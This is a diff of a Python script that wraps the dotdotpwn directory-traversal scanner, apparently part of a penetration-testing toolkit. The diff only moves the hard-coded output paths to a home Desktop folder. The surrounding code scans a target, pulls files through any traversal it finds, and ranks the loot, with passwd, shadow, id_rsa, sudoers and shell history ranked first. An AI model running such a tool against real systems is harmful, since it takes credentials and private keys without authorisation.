@@ -70,7 +70,7 @@ def dotPwn(URL):
                 vuln.append(line)
         if (writeOutputFile):
             try:
-                outfile = "/root/scripts/recon_enum/results/exam/dotdotpwn/%s" % resultsOut
+                outfile = "/home/ianwolf/Desktop/output/dotdotpwn/%s" % resultsOut
                 print "INFO: Traversals found! See %s" % outfile
                 outFileWriter = open(outfile, "w")
                 outFileWriter.write(ex.output)
@@ -91,7 +91,7 @@ def dotPwn(URL):
                     vuln.append(line)
             if (writeOutputFile):
                 try:
-                    outfile = "/root/scripts/recon_enum/results/exam/dotdotpwn/E%s" % resultsOut
+                    outfile = "/home/ianwolf/desktop/output/dotdotpwn/E%s" % resultsOut
                     print "INFO: Traversals found using extensions! See %s" % outfile
                     outFileWriter = open(outfile, "w")
                     outFileWriter.write(fx.output)
@@ -131,7 +131,7 @@ def retrieve():
             #print "DEBUG: %s" % fullURL
             fileContents, status_code = grabFileFromURL(fullURL)
             if (status_code == 200):
-                outputFile = "/root/scripts/recon_enum/results/exam/dotdotpwn/%s_%s" % (vulnBasetmp, xfiltmp)
+                outputFile = "/home/ianwolf/Desktop/output/dotdotpwn/%s_%s" % (vulnBasetmp, xfiltmp)
                 try:
                     output = open(outputFile, 'w+')
                     output.write(fileContents)
@@ -165,7 +165,7 @@ def grabFileFromURL(url):
 
 
 def sortRetrievedFiles():
-    downloadDir = "/root/scripts/recon_enum/results/exam/dotdotpwn/"
+    downloadDir = "/home/ianwolf/Desktop/output/dotdotpwn/"
     os.chdir(downloadDir)
     files = os.listdir(downloadDir)
     sizes = []
@@ -189,7 +189,7 @@ def sortRetrievedFiles():
                 files.remove(items)
 
 def sortMostInterestingFiles():
-    downloadDir = "/root/scripts/recon_enum/results/exam/dotdotpwn/"
+    downloadDir = "/home/ianwolf/Desktop/output/dotdotpwn/"
     os.chdir(downloadDir)
     files = os.listdir(downloadDir)
     mostInterestingFiles = "passwd","shadow","id_rsa","id_dsa","passdb","samba","ssh","authorized","sudoers","history"
@@ -205,7 +205,7 @@ def sortMostInterestingFiles():
                 break
 
 def sortEverythingElse():
-    downloadDir = "/root/scripts/recon_enum/results/exam/dotdotpwn/"
+    downloadDir = "/home/ianwolf/Desktop/output/dotdotpwn/"
     os.chdir(downloadDir)
     files = os.listdir(downloadDir)
     everythingElse = "etc","var","proc"
@@ -352,7 +352,7 @@ if __name__=='__main__':
     parser.add_argument('os', type=str, action="store", help="OS greatly helps reduce false positives and reduces scan time. 'windows' or 'unix'")
     parser.add_argument('-s', '--scan', action="store_true", dest="scan", default="true", help="scan the target for directory traversal")
     parser.add_argument('-sr', '--scan-and-retrieve', nargs='?', const='true', default='false', dest="scan_and_retrieve", help="scan and retrieve files if a directory traversal is found")
-    parser.add_argument('-x', '--xfil-files', type=str, action="store", dest="xfil_files", default="/root/lists/Personal/DirTrav/linux_all.txt", help="list of files to retrieve if a directory traversal vulnerability is found. Default is linux_all.txt.")
+    parser.add_argument('-x', '--xfil-files', type=str, action="store", dest="xfil_files", default="/home/ianwolf/Desktop/DirTrav/linux_all.txt", help="list of files to retrieve if a directory traversal vulnerability is found. Default is linux_all.txt.")
 
     args = parser.parse_args()
     #print args
